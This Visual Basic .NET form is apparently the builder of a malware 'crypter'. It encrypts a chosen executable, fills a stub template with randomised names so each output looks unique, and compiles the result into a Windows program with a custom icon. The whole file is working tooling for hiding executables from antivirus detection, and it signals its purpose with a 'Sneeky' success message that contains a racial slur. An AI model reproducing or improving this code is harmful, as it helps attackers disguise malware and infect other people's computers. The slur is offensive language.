Imports System.CodeDom.Compiler
Imports System.Reflection
Public Class Form1
    Dim OriginalFile, Crypted, Stub, SaveFile, EncryptedString, StubIcon As String
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Using fo As New OpenFileDialog()
                fo.RestoreDirectory = True
                fo.Multiselect = False
                fo.Filter = "Executable *.exe|*.exe"
                'AxWindowsMediaPlayer1.URL = "http://afonsosolitaire.free.fr/Musicas/Inglaise/Pump%20It%20Up.mp3"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then OriginalFile = fo.FileName
                TextBox1.Text = OriginalFile
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Using fo As New SaveFileDialog()
                fo.RestoreDirectory = True
                fo.Filter = "Executable *.exe|*.exe"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then SaveFile = fo.FileName
                TextBox2.Text = SaveFile
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            Using fo As New OpenFileDialog()
                fo.RestoreDirectory = True
                fo.Multiselect = False
                fo.Filter = "Icon *.ico|*.ico"
                fo.ShowDialog()
                If Not fo.FileName = Nothing Then StubIcon = fo.FileName
                TextBox3.Text = StubIcon
            End Using
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Stub As String = My.Resources.bubby ' Declaring our stub source
        Dim tKey As String = "eM½àËyMæùƒúBó¾ªKòr\^¤œR.ô®¥ªG®Ðs…±ß²d£uöJiwÙ‹±xwÕú" ' Our Temp Encryption Key
        Dim Key As String = ToolBox.EncryptText(ToolBox.StringGen(50), tKey) ' Our Encryption Key
        Dim DropFile As String = (ToolBox.StringGen(9)) ' Our DropFile
        EncryptedString = ToolBox.EncryptText(Convert.ToBase64String(IO.File.ReadAllBytes(OriginalFile)), Key)
        ' Generate Random Strings for a more unique output.
        Stub = Stub.Replace("ΦGtmBoiiΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦThisKeyΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦDcryptdΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦDropStringΦ", ToolBox.StringGen(23))
        Stub = Stub.Replace("ΦS1Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS2Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS3Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS4Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS5Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS6Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS7Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦS8Φ", ToolBox.StringGen(14))
        Stub = Stub.Replace("ΦM1Φ", ToolBox.StringGen(8))
        Stub = Stub.Replace("ΦF1Φ", ToolBox.StringGen(14))
        ' End Random String Generation
        Stub = Stub.Replace("ΦKSKpPsbΦ", ToolBox.format(EncryptedString))
        Stub = Stub.Replace("ΦJZtSgktΦ", Key)
        Stub = Stub.Replace("ΦDropFileΦ", DropFile)
        Clipboard.SetText(Stub) ' Allow for Debugging of Stub Code.
        IO.File.Copy(StubIcon, "C:\tmp.ico")
        Compile(SaveFile, Stub)
        IO.File.Delete("C:\tmp.ico")
        MsgBox("Nigga You Sneeky")
    End Sub
    Public Sub Compile(ByVal Output As String, ByVal Source As String)
        Dim Version = New Dictionary(Of String, String)
        Version.Add("CompilerVersion", "v2.0")
        Dim Compiler As ICodeCompiler = (New VBCodeProvider).CreateCompiler
        Dim Parameters As New CompilerParameters()
        Dim cResults As CompilerResults
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = Output
        Parameters.CompilerOptions = "/target:winexe" & " /win32icon:C:\tmp.ico"
        Parameters.ReferencedAssemblies.Add("System.dll")
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        If cResults.Errors.Count > 0 Then
            For Each CompilerError In cResults.Errors
                MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next
        ElseIf cResults.Errors.Count = 0 Then
        End If
    End Sub
    Private Sub Form1_Formclosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        MsgBox("See you later, Space Cowboy.")
    End Sub
End Class